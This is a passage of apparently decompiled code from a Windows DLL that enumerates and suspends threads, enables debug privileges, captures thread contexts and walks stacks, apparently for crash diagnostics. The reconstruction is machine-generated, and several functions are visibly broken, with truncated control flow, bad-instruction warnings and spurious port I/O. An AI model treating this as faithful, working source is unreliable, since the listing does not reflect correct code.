    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(param_1 + 4);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_1002f930 */

void __thiscall FUN_1002f930(int param_1,code *param_2,undefined4 param_3,undefined4 param_4)

{
  code *pcVar1;
  code *pcVar2;
  uint uVar3;
  int iVar4;
  undefined2 extraout_DX;
  bool bVar5;
  undefined4 uVar6;
  int iVar7;
  int local_68;
  undefined1 local_60 [16];
  int local_50;
  int local_48;
  int local_40;
  undefined1 local_38 [16];
  int local_28;
  int local_20;
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076480;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *(undefined4 *)(param_2 + 0x10) = param_4;
  *(undefined4 *)(param_2 + 0x14) = 0;
  local_18 = uVar3;
  if (*(int *)(*(int *)(param_1 + 0xc) + 0x10) != 0) {
    uVar6 = param_4;
    iVar7 = param_1;
    FUN_1002de70(L"SeDebugPrivilege",0);
    local_8 = 0;
    FUN_1002de70(L"SeTcbPrivilege",0);
    local_8 = CONCAT31(local_8._1_3_,1);
    iVar4 = (**(code **)(*(int *)(param_1 + 0xc) + 0x10))(0x1fffff,0,param_4,uVar3);
    pcVar2 = DAT_10079270;
    param_4 = uVar6;
    param_1 = iVar7;
    if (iVar4 != 0) {
      FUN_10006250("ThreadTrace dwTid = %d, hThread = %x\n",uVar6,iVar4);
      FUN_10030210(param_2,param_3,iVar4);
      (*pcVar2)(iVar4);
      param_4 = uVar6;
      param_1 = iVar7;
    }
    bVar5 = local_50 == 0;
    FUN_103cfbde();
    pcVar1 = pcVar2 + 4;
    out(*(undefined4 *)pcVar2,extraout_DX);
    if (((!bVar5) && (local_48 != 0)) && (local_68 != 0)) {
      (*param_2)(local_68,0,local_60,0,0,0);
    }
    if ((pcVar1 != (code *)0x0) && (local_68 != 0)) {
      (*pcVar1)(local_68);
    }
    if (((local_28 != 0) && (local_20 != 0)) && (local_40 != 0)) {
      (*param_2)(local_40,0,local_38,0,0,0);
    }
    if ((pcVar1 != (code *)0x0) && (local_40 != 0)) {
      (*pcVar1)(local_40);
    }
  }
  ExceptionList = local_10;
  FUN_100579df(param_4,param_1);
  return;
}



/* Function: FUN_1002fa80 */

void __thiscall FUN_1002fa80(int param_1,int param_2,int param_3)

{
  code *pcVar1;
  undefined4 uVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  int extraout_ECX;
  int iVar6;
  undefined8 uVar7;
  int local_50;
  int local_4c;
  int local_48;
  int local_44;
  int *local_40;
  int local_3c;
  int local_38;
  int *local_34;
  undefined4 local_30;
  undefined4 uStack_2c;
  int iStack_28;
  int iStack_24;
  undefined8 local_20;
  undefined4 local_18;
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100764b8;
  local_10 = ExceptionList;
  local_14 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_38 = param_3;
  pcVar1 = *(code **)(*(int *)(param_1 + 0xc) + 0x10);
  local_3c = param_1;
  if (pcVar1 != (code *)0x0) {
    local_4c = (*pcVar1)(2,0,param_3,local_14);
    if (local_4c != 0) {
      FUN_10006250("Suspending: dwTid = %d, hThread = %x\n",local_38,local_4c);
      FUN_105ca1ca(&stack0xfffffffc,local_4c);
    }
    iVar4 = *(int *)(param_1 + 4);
    local_50 = local_38;
    uVar2 = FUN_10019200(iVar4,*(undefined4 *)(iVar4 + 4),&local_50);
    uVar7 = CONCAT44(uVar2,*(int *)(param_1 + 8));
    iVar5 = 0xffffffe - *(int *)(param_1 + 8);
    if (iVar5 != 0) goto LAB_1002fb1c;
LAB_1002fb12:
    uVar7 = FUN_10056a6a("list<T> too long");
    iVar5 = extraout_ECX;
LAB_1002fb1c:
    iVar6 = (int)((ulonglong)uVar7 >> 0x20);
    *(int *)(param_1 + 8) = (int)uVar7 + 1;
    *(int *)(iVar4 + 4) = iVar6;
    **(int **)(iVar6 + 4) = iVar6;
    local_34 = (int *)FUN_10269a5f(iVar5,4,0);
    if (local_34 == (int *)0xffffffff) {
      local_40 = (int *)FUN_100581b4(0x40e);
      if (local_40 != (int *)0x0) {
        local_40[1] = 0x200;
        *local_40 = 0;
        local_40[2] = 0;
        *(undefined2 *)(local_40 + 3) = 0;
      }
      local_3c = FUN_10392dc7();
      FUN_1001e820(param_1);
      local_8 = 0;
      piVar3 = (int *)FUN_1000ae10(&local_34);
      if (*piVar3 == 0) {
        iVar4 = 0;
      }
      else {
        iVar4 = *piVar3 + 0xc;
      }
      FUN_10006250("CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) failed. %s\n",iVar4);
      if (local_34 != (int *)0x0) {
        LOCK();
        iVar4 = *local_34;
        *local_34 = iVar4 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(local_34);
        }
      }
      if (local_40 != (int *)0x0) {
        LOCK();
        iVar4 = *local_40;
        *local_40 = *local_40 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(local_40);
        }
      }
    }
    else {
      local_18 = 0;
      uStack_2c = 0;
      iStack_28 = 0;
      iStack_24 = 0;
      local_20 = 0;
      local_30 = 0x1c;
      iVar4 = FUN_105cc267();
      if (iVar4 != 0) {
        do {
          iVar4 = iStack_28;
          if ((iStack_24 == param_2) && (local_38 != iStack_28)) {
            iVar5 = (**(code **)(*(int *)(param_1 + 0xc) + 0x10))(2,0,iStack_28);
            if (iVar5 != 0) {
              FUN_10006250("ThreadTrace dwTid = %d, hThread = %x\n",iVar4,iVar5);
              FUN_10357295(iVar4,iVar5);
            }
            param_1 = local_3c;
            local_48 = iVar4;
            iVar4 = *(int *)(local_3c + 4);
            local_44 = iVar5;
            iVar5 = FUN_10019200(iVar4,*(undefined4 *)(iVar4 + 4),&local_48);
            if (*(int *)(param_1 + 8) == 0xffffffe) goto LAB_1002fb12;
            *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + 1;
            *(int *)(iVar4 + 4) = iVar5;
            **(int **)(iVar5 + 4) = iVar5;
          }
          iVar4 = FUN_104329bf(&stack0xfffffffc,local_34,&local_30);
          if (iVar4 == 0) break;
        } while( true );
      }
      (*DAT_10079270)(local_34);
    }
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_1002fcd0 */

undefined4 * __fastcall FUN_1002fcd0(int param_1)

{
  code *pcVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  undefined4 *puVar5;
  int *piVar6;
  undefined4 local_40;
  int *local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined8 local_30;
  int *local_28;
  undefined4 *local_24;
  undefined4 local_20;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100764f8;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  puVar5 = (undefined4 *)**(int **)(param_1 + 4);
  piVar6 = (int *)*puVar5;
  if (piVar6 != *(int **)(param_1 + 4)) {
    do {
      local_40 = 0;
      local_3c = (int *)0x0;
      local_38 = 0;
      local_34 = 0;
      local_30 = 0;
      local_28 = (int *)0x0;
      local_8 = 1;
      local_24 = (undefined4 *)FUN_100582fa(8,uVar2);
      if (local_24 == (undefined4 *)0x0) {
        local_24 = (undefined4 *)0x0;
      }
      else {
        *local_24 = 0xffffffff;
        local_24[1] = 0xffffffff;
      }
      local_20 = 0;
      local_8 = 2;
      iVar3 = FUN_1002f930(&local_40,0,piVar6[2]);
      if (iVar3 != 0) {
        iVar3 = *(int *)(param_1 + 0x70);
        iVar4 = FUN_10031200(iVar3,*(undefined4 *)(iVar3 + 4),&local_40);
        if (*(int *)(param_1 + 0x74) == 0x5555554) {
          FUN_10056a6a("list<T> too long");
          pcVar1 = (code *)swi(3);
          puVar5 = (undefined4 *)(*pcVar1)();
          return puVar5;
        }
        *(int *)(param_1 + 0x74) = *(int *)(param_1 + 0x74) + 1;
        *(int *)(iVar3 + 4) = iVar4;
        **(int **)(iVar4 + 4) = iVar4;
      }
      local_8 = 0xffffffff;
      FUN_10030f10();
      puVar5 = (undefined4 *)thunk_FUN_100579ee(local_24);
      if (local_28 != (int *)0x0) {
        LOCK();
        iVar3 = *local_28;
        puVar5 = (undefined4 *)*local_28;
        *local_28 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          puVar5 = (undefined4 *)FUN_100579ee(local_28);
        }
      }
      if (local_3c != (int *)0x0) {
        LOCK();
        iVar3 = *local_3c;
        puVar5 = (undefined4 *)*local_3c;
        *local_3c = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          puVar5 = (undefined4 *)FUN_100579ee(local_3c);
        }
      }
      piVar6 = (int *)*piVar6;
    } while (piVar6 != *(int **)(param_1 + 4));
  }
  ExceptionList = local_10;
  return puVar5;
}



/* Function: FUN_1002fe30 */

/* WARNING: Control flow encountered bad instruction data */

void __thiscall FUN_1002fe30(int param_1,int param_2)

{
  char cVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  int *piVar5;
  char *pcVar6;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar7;
  char *pcVar8;
  int iVar9;
  undefined8 uVar10;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10076530;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  if (*(int *)(*(int *)(param_1 + 0x84) + 0xc) == 0) {
    return;
  }
  iVar9 = 0;
  local_8 = 1;
  ExceptionList = &local_10;
  uVar10 = FUN_100074a0(0x105,1);
  if ((int)uVar10 == 0) {
    pcVar8 = (char *)0x0;
  }
  else {
    pcVar8 = (char *)((int)uVar10 + 0xc);
  }
  iVar3 = FUN_1047af3d((int)((ulonglong)uVar10 >> 0x20),"_NT_SYMBOL_PATH",pcVar8,0x104,uVar2);
  uVar7 = extraout_ECX;
  if (iVar3 != 0) {
    FUN_10007b60(pcVar8,0xffffffff);
    iVar9 = FUN_10007b60(&DAT_10087afc,0xffffffff);
    uVar7 = extraout_ECX_00;
  }
  iVar3 = FUN_1058dc54(uVar7,"_NT_ALTERNATE_SYMBOL_PATH",pcVar8,0x104);
  if (iVar3 != 0) {
    FUN_10007b60(pcVar8,0xffffffff);
    iVar9 = FUN_10007b60(&DAT_10087afc,0xffffffff);
  }
  if (param_2 != 0) {
    if ((DAT_1009b554 & 1) == 0) {
      DAT_1009b554 = DAT_1009b554 | 1;
      FUN_1001aca0();
      FUN_10057b51(&DAT_10078500);
    }
    iVar3 = (*DAT_1009b56c)(param_2,0,pcVar8,0x104);
    if (iVar3 != 0) {
      if ((pcVar8 == (char *)0x0) || (*pcVar8 != '\0')) {
        piVar4 = (int *)FUN_100075b0();
      }
      else {
        piVar4 = (int *)FUN_10007ae0();
      }
      FUN_10028c10(0);
      if (piVar4 == (int *)0x0) {
        piVar5 = (int *)0x0;
      }
      else {
        piVar5 = piVar4 + 3;
      }
      iVar3 = FUN_10012920(piVar5,0xffffffff,0);
      if (iVar3 == -1) {
        if (piVar4 == (int *)0x0) {
          piVar5 = (int *)0x0;
        }
        else {
          piVar5 = piVar4 + 3;
        }
        FUN_10007b60(piVar5,0xffffffff);
        iVar9 = FUN_10007b60(&DAT_10087afc,0xffffffff);
      }
      if (piVar4 != (int *)0x0) {
        LOCK();
        iVar3 = *piVar4;
        *piVar4 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(piVar4);
        }
      }
    }
  }
  pcVar6 = (char *)FUN_1009e8b4(0x104,pcVar8);
  if (pcVar8 != (char *)0x0) {
    if ((iVar9 != 0) && (*(int *)(iVar9 + 8) != 0)) {
      if (pcVar6 == (char *)0x0) {
        iVar9 = 0;
      }
      else {
        pcVar8 = pcVar6;
        do {
          cVar1 = *pcVar8;
          pcVar8 = pcVar8 + 1;
        } while (cVar1 != '\0');
        iVar9 = (int)pcVar8 - (int)(pcVar6 + 1);
      }
      iVar9 = FUN_1004b540(pcVar6,iVar9);
      if (iVar9 != -1) goto LAB_10030033;
    }
    FUN_10007b60(pcVar6,0xffffffff);
    FUN_10007b60(&DAT_10087afc,0xffffffff);
  }
LAB_10030033:
  FUN_1017921e(pcVar6,0x104);
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: FUN_10030210 */

void __thiscall FUN_10030210(int *param_1,int *param_2,int param_3,uint param_4)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  undefined4 *puVar4;
  int iVar5;
  int *piVar6;
  int *piVar7;
  ushort in_ES;
  undefined4 uVar8;
  int *local_768;
  undefined4 local_760;
  undefined4 uStack_75c;
  int iStack_758;
  char *pcStack_754;
  undefined4 local_750;
  int *local_74c;
  int *local_748;
  int *local_744;
  int *local_740;
  int *local_73c;
  int *local_738;
  undefined4 local_734;
  int local_730;
  int local_72c;
  undefined4 local_728;
  int *local_724;
  undefined4 local_720;
  int *local_71c;
  int *local_718;
  int *local_714;
  int local_710;
  int *local_70c;
  int *local_708;
  int *local_704;
  int *local_700;
  int *local_6fc;
  int *local_6f8;
  uint local_6f4;
  undefined4 local_6f0;
  int local_6ec;
  char local_6b4;
  int local_4b0 [180];
  int local_1e0 [2];
  undefined4 local_1d8;
  int local_1c8;
  undefined4 local_1c0;
  int local_1bc;
  undefined4 local_1b4;
  undefined4 local_138;
  uint local_134;
  undefined4 local_128;
  undefined1 local_124 [268];
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100765b3;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  iVar3 = param_1[0x1e];
  local_71c = param_2;
  local_6f4 = param_4;
  local_710 = param_1[0x21];
  local_738 = (int *)0x0;
  local_734 = 0;
  local_73c = param_1;
  local_18 = uVar2;
  local_738 = (int *)FUN_10018da0(0,0);
  local_8 = 0;
  local_72c = 0;
  local_730 = iVar3;
  if (iVar3 != 0) {
    FUN_10022ca0(iVar3);
  }
  local_8 = 1;
  if ((*(int *)(local_710 + 0x20) == 0) ||
     ((*(int *)(*(int *)(*param_1 + 0x14) + 0x340) == 0 && (param_3 != 0)))) goto LAB_10030b66;
  FUN_1005ff60(local_4b0,0,0x2cc,uVar2);
  if (param_3 == 0) {
    piVar6 = local_4b0;
    local_4b0[0] = 0x10003;
    local_714 = piVar6;
    iVar3 = FUN_103f7e1a(local_6f4,piVar6);
    uVar2 = (uint)in_ES;
    if (iVar3 != 0) goto LAB_1003030c;
    FUN_1001e7d0(uVar2);
    local_8._0_1_ = 2;
    piVar6 = (int *)FUN_1000ae10(&local_718);
    if (*piVar6 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = *piVar6 + 0xc;
    }
    FUN_10006250("GetThreadContext failed. %s\n",iVar3);
    if (local_718 != (int *)0x0) {
      LOCK();
      iVar3 = *local_718;
      *local_718 = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(local_718);
      }
    }
    if (local_768 == (int *)0x0) goto LAB_10030b66;
    LOCK();
    iVar3 = *local_768;
    *local_768 = *local_768 + -1;
    UNLOCK();
    if (-1 < iVar3 + -1) goto LAB_10030b66;
  }
  else {
    piVar6 = (int *)(*(int *)(*param_1 + 0x14) + 0x74);
    local_714 = piVar6;
LAB_1003030c:
    FUN_1005ff60(local_1e0,0,0xa4,uVar2);
    local_1d8 = 3;
    local_1e0[0] = piVar6[0x2e];
    local_1b4 = 3;
    local_1bc = piVar6[0x31];
    local_1c0 = 3;
    local_1c8 = piVar6[0x2d];
    FUN_10006250("StackWalkW32 hThread %x, Eip %x\n",local_6f4,piVar6[0x2e]);
    local_708 = (int *)0x0;
    local_704 = (int *)0x0;
    local_700 = (int *)0x0;
    local_8._0_1_ = 3;
    if (*local_71c == -0x3fffff03) {
      uVar8 = 0x400;
    }
    else {
      uVar8 = 0x20;
    }
    FUN_100172c0(uVar8);
    piVar7 = local_704;
    if (local_700 != (int *)0x0) {
      local_70c = local_700;
      local_6f8 = (int *)0x0;
      iVar3 = (**(code **)(local_710 + 0x20))
                        (0x14c,param_1[0x1e],local_6f4,local_1e0,piVar6,0,
                         *(undefined4 *)(local_710 + 0x24),*(undefined4 *)(local_710 + 0x2c),0);
      piVar7 = local_704;
      if (iVar3 == 0) {
        piVar6 = (int *)0x0;
      }
      else {
        while (piVar6 = local_6f8, local_6f8 < local_70c) {
          if (local_1e0[0] != 0) {
            local_6f8 = (int *)((int)local_6f8 + 1);
            if (local_700 <= piVar7) {
              FUN_100172c0((int)piVar7 + 1);
              piVar7 = local_704;
            }
            if (local_708 + (int)piVar7 != (int *)0x0) {
              local_708[(int)piVar7] = local_1e0[0];
            }
            piVar7 = (int *)((int)piVar7 + 1);
            local_704 = piVar7;
          }
          piVar6 = local_6f8;
          if (((int *)((int)local_70c - 1U) <= local_6f8) ||
             (iVar3 = (**(code **)(local_710 + 0x20))
                                (0x14c,param_1[0x1e],local_6f4,local_1e0,local_714,0,
                                 *(undefined4 *)(local_710 + 0x24),*(undefined4 *)(local_710 + 0x2c)
                                 ,0), piVar6 = local_6f8, iVar3 == 0)) break;
        }
      }
      if (*local_71c == -0x3fffff03) {
        FUN_10015ef0(&local_738);
        piVar6 = local_704;
        piVar7 = local_704;
      }
      while (piVar6 != (int *)0x0) {
        local_6f8 = (int *)((int)piVar6 + -1);
        local_6f4 = local_708[(int)local_6f8];
        local_728 = 0;
        param_1[0x27] = 0;
        FUN_1005ff60(&local_6f0,0,0x23c);
        piVar6 = (int *)param_1[0x22];
        local_6f0 = 0x23c;
        if (piVar6 == (int *)0x0) {
LAB_10030627:
          piVar6 = (int *)0x0;
        }
        else {
          if (*piVar6 != 0) {
            LOCK();
            iVar3 = *piVar6;
            *piVar6 = iVar3 + -1;
            UNLOCK();
            if (iVar3 + -1 < 0) {
              FUN_100579ee(piVar6);
            }
            goto LAB_10030627;
          }
          piVar6[2] = 0;
          *(undefined1 *)(piVar6 + 3) = 0;
        }
        param_1[0x22] = (int)piVar6;
        param_1[0x26] = 0;
        if ((*(code **)(local_710 + 0x28) == (code *)0x0) ||
           (iVar3 = (**(code **)(local_710 + 0x28))(param_1[0x1e],local_6f4,&local_6f0), iVar3 == 0)
           ) {
          FUN_10605af6(0xffffffff,0);
          piVar1 = local_73c;
          piVar6 = (int *)0x0;
          piVar7 = (int *)*local_738;
          if (piVar7 != local_738) {
            do {
              if (local_6f4 < (uint)piVar7[3]) break;
              piVar6 = piVar7 + 2;
              piVar7 = (int *)*piVar7;
            } while (piVar7 != local_738);
            param_1 = piVar1;
            local_6fc = piVar6;
            if (piVar6 != (int *)0x0) {
              uVar8 = FUN_1000ae10(&local_748);
              local_8._0_1_ = 5;
              local_718 = (int *)piVar1[0x1f];
              iVar3 = FUN_10011570(local_718,local_718[1],uVar8);
              if (piVar1[0x20] == 0x15555554) goto LAB_10030b35;
              piVar1[0x20] = piVar1[0x20] + 1;
              local_718[1] = iVar3;
              **(int **)(iVar3 + 4) = iVar3;
              if (local_748 != (int *)0x0) {
                LOCK();
                iVar3 = *local_748;
                *local_748 = iVar3 + -1;
                UNLOCK();
                if (iVar3 + -1 < 0) {
                  FUN_100579ee(local_748);
                }
              }
              piVar6 = (int *)*local_6fc;
              if (piVar6 != (int *)0x0) {
                LOCK();
                *piVar6 = *piVar6 + 1;
                UNLOCK();
              }
              local_720 = 0x5c;
              local_714 = piVar6;
              iVar3 = FUN_10010c00();
              if (piVar6 == (int *)0x0) {
                iVar5 = 0;
              }
              else {
                iVar5 = piVar6[2];
              }
              iVar5 = iVar5 - (iVar3 + 1);
              if (iVar5 != 0) {
                puVar4 = (undefined4 *)FUN_1000e640(&local_74c,iVar3 + 1,iVar5);
                piVar6 = (int *)FUN_10010440(*puVar4);
                local_714 = piVar6;
                if (local_74c != (int *)0x0) {
                  LOCK();
                  iVar3 = *local_74c;
                  *local_74c = iVar3 + -1;
                  UNLOCK();
                  if (iVar3 + -1 < 0) {
                    FUN_100579ee(local_74c);
                  }
                }
              }
              if (piVar6 != (int *)0x0) {
                LOCK();
                *piVar6 = *piVar6 + 1;
                UNLOCK();
              }
              local_8 = CONCAT31(local_8._1_3_,7);
              local_740 = piVar6;
              puVar4 = (undefined4 *)FUN_1000ae10(&local_744);
              iVar3 = FUN_10007010(*puVar4);
              piVar1[0x22] = iVar3;
              if (local_744 != (int *)0x0) {
                LOCK();
                iVar3 = *local_744;
                *local_744 = iVar3 + -1;
                UNLOCK();
                if (iVar3 + -1 < 0) {
                  FUN_100579ee(local_744);
                }
              }
              if (piVar6 != (int *)0x0) {
                LOCK();
                iVar3 = *piVar6;
                *piVar6 = iVar3 + -1;
                UNLOCK();
                if (iVar3 + -1 < 0) {
                  FUN_100579ee(piVar6);
                }
              }
              piVar1[0x26] = local_6f4 - local_6fc[1];
              local_8._0_1_ = 3;
              if (piVar6 != (int *)0x0) {
                LOCK();
                iVar3 = *piVar6;
                *piVar6 = iVar3 + -1;
                UNLOCK();
                if (iVar3 + -1 < 0) {
                  FUN_100579ee(piVar6);
                }
              }
            }
          }
        }
        else {
          if (local_6b4 == '\0') {
            piVar6 = (int *)FUN_10007ae0();
          }
          else {
            piVar6 = (int *)FUN_100075b0();
          }
          local_8._0_1_ = 4;
          local_718 = (int *)param_1[0x1f];
          local_724 = piVar6;
          iVar3 = FUN_10011570(local_718,local_718[1],&local_724);
          if (param_1[0x20] == 0x15555554) {
LAB_10030b35:
            FUN_10056a6a("list<T> too long");
            goto LAB_10030b3f;
          }
          param_1[0x20] = param_1[0x20] + 1;
          local_718[1] = iVar3;
          local_8._0_1_ = 3;
          **(int **)(iVar3 + 4) = iVar3;
          if (piVar6 != (int *)0x0) {
            LOCK();
            iVar3 = *piVar6;
            *piVar6 = iVar3 + -1;
            UNLOCK();
            if (iVar3 + -1 < 0) {
              FUN_100579ee(piVar6);
            }
          }
          if (local_6b4 == '\0') {
            local_6fc = (int *)FUN_10007ae0();
          }
          else {
            local_6fc = (int *)FUN_100075b0();
          }
          uVar8 = FUN_10027a40();
          iVar3 = FUN_100070d0(uVar8,0xffffffff);
          param_1[0x22] = iVar3;
          param_1[0x26] = local_6f4 - local_6ec;
          if (local_6fc != (int *)0x0) {
            LOCK();
            iVar3 = *local_6fc;
            *local_6fc = iVar3 + -1;
            UNLOCK();
            if (iVar3 + -1 < 0) {
              FUN_100579ee(local_6fc);
            }
          }
        }
        FUN_1005ff60(&local_138,0,0x11c);
        piVar6 = (int *)param_1[0x23];
        local_138 = 0x18;
        local_134 = local_6f4;
        local_128 = 0x104;
        if (piVar6 == (int *)0x0) {
LAB_100309ac:
          piVar6 = (int *)0x0;
        }
        else {
          if (*piVar6 != 0) {
            LOCK();
            iVar3 = *piVar6;
            *piVar6 = iVar3 + -1;
            UNLOCK();
            if (iVar3 + -1 < 0) {
              FUN_100579ee(piVar6);
            }
            goto LAB_100309ac;
          }
          piVar6[2] = 0;
          *(undefined1 *)(piVar6 + 3) = 0;
        }
        param_1[0x23] = (int)piVar6;
        piVar6 = (int *)param_1[0x24];
        if (piVar6 == (int *)0x0) {
LAB_100309e1:
          piVar6 = (int *)0x0;
        }
        else {
          if (*piVar6 != 0) {
            LOCK();
            iVar3 = *piVar6;
            *piVar6 = iVar3 + -1;
            UNLOCK();
            if (iVar3 + -1 < 0) {
              FUN_100579ee(piVar6);
            }
            goto LAB_100309e1;
          }
          piVar6[2] = 0;
          *(undefined1 *)(piVar6 + 3) = 0;
        }
        param_1[0x24] = (int)piVar6;
        if ((*(code **)(local_710 + 0x30) == (code *)0x0) ||
           (iVar3 = (**(code **)(local_710 + 0x30))(param_1[0x1e],local_6f4,&local_728,&local_138),
           iVar3 == 0)) {
          FUN_1013d862();
        }
        else {
          iVar3 = FUN_100070d0(local_124,0xffffffff);
          param_1[0x24] = iVar3;
          uStack_75c = 0;
          iStack_758 = 0;
          pcStack_754 = (char *)0x0;
          local_750 = 0;
          local_760 = 0x14;
          if ((*(code **)(local_710 + 0x34) != (code *)0x0) &&
             (iVar3 = (**(code **)(local_710 + 0x34))(param_1[0x1e],local_6f4,&local_728,&local_760)
             , iVar3 != 0)) {
            if ((pcStack_754 == (char *)0x0) || (*pcStack_754 != '\0')) {
              local_70c = (int *)FUN_100075b0();
            }
            else {
              local_70c = (int *)FUN_10007ae0();
            }
            uVar8 = FUN_10027a40();
            iVar3 = FUN_100070d0(uVar8,0xffffffff);
            param_1[0x23] = iVar3;
            param_1[0x27] = iStack_758;
            if (local_70c != (int *)0x0) {
              LOCK();
              iVar3 = *local_70c;
              *local_70c = iVar3 + -1;
              UNLOCK();
              if (iVar3 + -1 < 0) {
                FUN_100579ee(local_70c);
              }
            }
          }
        }
        param_1[0x25] = local_6f4;
        FUN_10030be0(local_71c);
        piVar6 = local_6f8;
        piVar7 = local_704;
      }
    }
    if (local_708 == (int *)0x0) {
LAB_10030b3f:
      piVar7 = (int *)0x0;
    }
    else {
      piVar7 = local_708 + (int)piVar7;
    }
    FUN_10017250(local_708,piVar7);
    local_768 = local_708;
    if (local_708 == (int *)0x0) goto LAB_10030b66;
  }
  FUN_100579ee(local_768);
LAB_10030b66:
  local_8 = 8;
  if ((DAT_1009b4dc & 1) == 0) {
    DAT_1009b4dc = DAT_1009b4dc | 1;
    FUN_1001a9a0();
    FUN_10057b51(&DAT_100784c0);
  }
  if ((DAT_1009b4f8 != (code *)0x0) && (local_72c != 0)) {
    (*DAT_1009b4f8)(local_730);
  }
  FUN_1000ba10();
  thunk_FUN_100579ee(local_738);
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_10030be0 */

void __fastcall FUN_10030be0(int param_1)

{
  int iVar1;
  uint uVar2;
  undefined4 *puVar3;
  int *piVar4;
  int *local_30;
  undefined4 uStack_2c;
  undefined4 uStack_28;
  int *piStack_24;
  int *local_20;
  undefined4 local_1c;
  int *local_18 [2];
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100765e8;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_20 = (int *)0x0;
  local_30 = (int *)0x0;
  uStack_2c = 0;
  uStack_28 = 0;
  piStack_24 = (int *)0x0;
  local_1c = 0;
  local_8 = 0;
  if ((*(int *)(param_1 + 0x88) != 0) && (*(int *)(*(int *)(param_1 + 0x88) + 8) != 0)) {
    puVar3 = (undefined4 *)FUN_10030e80(local_18);
    local_30 = (int *)FUN_10010440(*puVar3);
    if (local_18[0] != (int *)0x0) {
      LOCK();
      iVar1 = *local_18[0];
      *local_18[0] = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(local_18[0]);
      }
    }
  }
  uStack_2c = *(undefined4 *)(param_1 + 0x94);
  uStack_28 = *(undefined4 *)(param_1 + 0x98);
  piVar4 = piStack_24;
  if ((*(int *)(param_1 + 0x90) != 0) && (*(int *)(*(int *)(param_1 + 0x90) + 8) != 0)) {
    puVar3 = (undefined4 *)FUN_10030e80(local_18);
    piVar4 = (int *)FUN_10010440(*puVar3);
    piStack_24 = piVar4;
    if (local_18[0] != (int *)0x0) {
      LOCK();
      iVar1 = *local_18[0];
      *local_18[0] = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(local_18[0]);
      }
    }
  }
  if ((*(int *)(param_1 + 0x8c) != 0) && (*(int *)(*(int *)(param_1 + 0x8c) + 8) != 0)) {
    puVar3 = (undefined4 *)FUN_10030e80(local_18);
    local_20 = (int *)FUN_10010440(*puVar3);
    if (local_18[0] != (int *)0x0) {
      LOCK();
      iVar1 = *local_18[0];
      *local_18[0] = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(local_18[0]);
      }
    }
    local_1c = *(undefined4 *)(param_1 + 0x9c);
  }
  FUN_10030dd0(&local_30);
  if (local_20 != (int *)0x0) {
    LOCK();
    iVar1 = *local_20;
    *local_20 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(local_20,uVar2);
    }
  }
  if (piVar4 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar4;
    *piVar4 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar4);
    }
  }
  if (local_30 != (int *)0x0) {
    LOCK();
    iVar1 = *local_30;
    *local_30 = *local_30 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(local_30);
    }
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_10030d80 */

void __fastcall FUN_10030d80(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = (int *)param_1[4];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[3];
